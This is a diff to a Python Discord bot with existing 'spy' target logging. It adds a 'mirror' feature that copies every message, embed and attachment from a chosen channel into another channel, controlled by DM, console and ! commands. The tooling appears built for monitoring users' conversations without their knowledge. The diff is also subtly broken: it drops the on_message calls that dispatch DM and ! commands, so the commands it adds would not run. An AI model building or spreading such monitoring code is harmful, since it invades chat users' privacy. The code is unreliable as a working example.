@@ -5,6 +5,7 @@ import os
 import asyncio
 import aioconsole
 from spy_config import add_spy_target, remove_spy_target, get_spy_targets
+from mirror_config import add_mirror_channel, remove_mirror_channel, get_mirror_channels
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
@@ -200,10 +201,27 @@ async def on_voice_state_update(member, before, after):
 async def on_message(message):
     if message.author == bot.user:
         return
-    if isinstance(message.channel, discord.DMChannel):
-        await process_dm_command(message)
-    await bot.process_commands(message)
 
+    mirror_config = get_mirror_channels()
+    source_channel_id = str(message.channel.id)
+    
+    if source_channel_id in mirror_config:
+        try:
+            target_channel = await bot.fetch_channel(int(mirror_config[source_channel_id]))
+
+            content = message.content
+            embeds = [embed.to_dict() for embed in message.embeds]
+            files = []
+            for attachment in message.attachments:
+                file = await attachment.to_file()
+                files.append(file)
+            await target_channel.send(
+                content=f"**{message.author.name}**: {content}",
+                embeds=[discord.Embed.from_dict(embed) for embed in embeds],
+                files=files if files else None
+            )
+        except Exception as e:
+            print(f"Error mirroring message: {e}")
 async def process_dm_command(message):
     # check is allowed
     if ALLOWED_USERS and str(message.author.id) not in ALLOWED_USERS:
@@ -298,6 +316,55 @@ async def process_dm_command(message):
         except Exception as e:
             await message.channel.send(f"Error: {str(e)}")
         return
+    elif content.startswith("mirror "):
+        parts = content.split()
+        if len(parts) < 3:
+            await message.channel.send("Usage: `mirror <source_channel_id> <target_channel_id>`")
+            return
+            
+        source_id = parts[1]
+        target_id = parts[2]
+        
+        try:
+            source_channel = await bot.fetch_channel(int(source_id))
+            target_channel = await bot.fetch_channel(int(target_id))
+            
+            add_mirror_channel(source_id, target_id)
+            await message.channel.send(f"✅ Started mirroring channel **{source_channel.name}** to **{target_channel.name}**")
+        except Exception as e:
+            await message.channel.send(f"Error: {str(e)}")
+
+    elif content.startswith("unmirror "):
+        parts = content.split()
+        if len(parts) < 2:
+            await message.channel.send("Usage: `unmirror <source_channel_id>`")
+            return
+            
+        source_id = parts[1]
+        try:
+            source_channel = await bot.fetch_channel(int(source_id))
+            if remove_mirror_channel(source_id):
+                await message.channel.send(f"🚫 Stopped mirroring channel **{source_channel.name}**")
+            else:
+                await message.channel.send(f"⚠️ Channel **{source_channel.name}** was not being mirrored")
+        except Exception as e:
+            await message.channel.send(f"Error: {str(e)}")
+
+    elif content == "mirrorlist":
+        mirror_config = get_mirror_channels()
+        if not mirror_config:
+            await message.channel.send("No channels are being mirrored currently.")
+            return
+            
+        mirror_list = "**Current mirrored channels:**\n"
+        for source_id, target_id in mirror_config.items():
+            try:
+                source_channel = await bot.fetch_channel(int(source_id))
+                target_channel = await bot.fetch_channel(int(target_id))
+                mirror_list += f"• {source_channel.name} ({source_id}) ➡️ {target_channel.name} ({target_id})\n"
+            except Exception as e:
+                mirror_list += f"• Unknown channel ({source_id}) ➡️ Unknown channel ({target_id}) - Error: {str(e)}\n"
+        await message.channel.send(mirror_list)
 
     #if unknown command
     if content.startswith(("spy", "unspy", "list", "help")):
@@ -376,7 +443,49 @@ async def process_console_command(command):
                 print(f"• {user.name} (ID: {user_id}) - Logs in: {location}")
             except Exception as e:
                 print(f"• Unknown user (ID: {user_id}) - Error: {str(e)}")
+    elif cmd == 'mirror':
+        if len(args) >= 2:
+            source_id = args[0]
+            target_id = args[1]
+            try:
+                source_channel = await bot.fetch_channel(int(source_id))
+                target_channel = await bot.fetch_channel(int(target_id))
+                
+                add_mirror_channel(source_id, target_id)
+                print(f"✅ Started mirroring channel {source_channel.name} to {target_channel.name}")
+            except Exception as e:
+                print(f"Error: {e}")
+        else:
+            print("Usage: mirror <source_channel_id> <target_channel_id>")
 
+    elif cmd == 'unmirror':
+        if len(args) >= 1:
+            source_id = args[0]
+            try:
+                source_channel = await bot.fetch_channel(int(source_id))
+                if remove_mirror_channel(source_id):
+                    print(f"🚫 Stopped mirroring channel {source_channel.name}")
+                else:
+                    print(f"⚠️ Channel {source_channel.name} was not being mirrored")
+            except Exception as e:
+                print(f"Error: {e}")
+        else:
+            print("Usage: unmirror <source_channel_id>")
+
+    elif cmd == 'mirrorlist':
+        mirror_config = get_mirror_channels()
+        if not mirror_config:
+            print("No channels are being mirrored currently.")
+            return
+            
+        print("Current mirrored channels:")
+        for source_id, target_id in mirror_config.items():
+            try:
+                source_channel = await bot.fetch_channel(int(source_id))
+                target_channel = await bot.fetch_channel(int(target_id))
+                print(f"• {source_channel.name} ({source_id}) ➡️ {target_channel.name} ({target_id})")
+            except Exception as e:
+                print(f"• Unknown channel ({source_id}) ➡️ Unknown channel ({target_id}) - Error: {str(e)}")
     elif cmd == 'help':
         print("""
 📋 Console Commands Help:
@@ -431,6 +540,46 @@ async def list_spied_users(ctx):
         except Exception as e:
             spy_list += f"• Unknown user (ID: {user_id}) - Error: {str(e)}\n"
     await ctx.send(spy_list)
+@bot.command(name='mirror')
+@is_allowed_user()
+async def mirror_channel(ctx, source_id: str, target_id: str):
+    try:
+        source_channel = await bot.fetch_channel(int(source_id))
+        target_channel = await bot.fetch_channel(int(target_id))
+        add_mirror_channel(source_id, target_id)
+        await ctx.send(f"✅ Started mirroring channel **{source_channel.name}** to **{target_channel.name}**")
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command(name='unmirror')
+@is_allowed_user()
+async def unmirror_channel(ctx, source_id: str):
+    try:
+        source_channel = await bot.fetch_channel(int(source_id))
+        if remove_mirror_channel(source_id):
+            await ctx.send(f"🚫 Stopped mirroring channel **{source_channel.name}**")
+        else:
+            await ctx.send(f"⚠️ Channel **{source_channel.name}** was not being mirrored")
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+
+@bot.command(name='mirrorlist')
+@is_allowed_user()
+async def list_mirrored_channels(ctx):
+    mirror_config = get_mirror_channels()
+    if not mirror_config:
+        await ctx.send("No channels are being mirrored currently.")
+        return
+        
+    mirror_list = "**Current mirrored channels:**\n"
+    for source_id, target_id in mirror_config.items():
+        try:
+            source_channel = await bot.fetch_channel(int(source_id))
+            target_channel = await bot.fetch_channel(int(target_id))
+            mirror_list += f"• {source_channel.name} ({source_id}) ➡️ {target_channel.name} ({target_id})\n"
+        except Exception as e:
+            mirror_list += f"• Unknown channel ({source_id}) ➡️ Unknown channel ({target_id}) - Error: {str(e)}\n"
+    await ctx.send(mirror_list)
 
 @bot.command(name='shelp')
 @is_allowed_user()
@@ -459,4 +608,4 @@ If channel_id is not provided, logs will be saved to a text file.
     await ctx.send(help_text)
 
 # Your bot token (will be replaced by setup script)
-bot.run('You can do it manually if u want')
+bot.run('or du it manually')
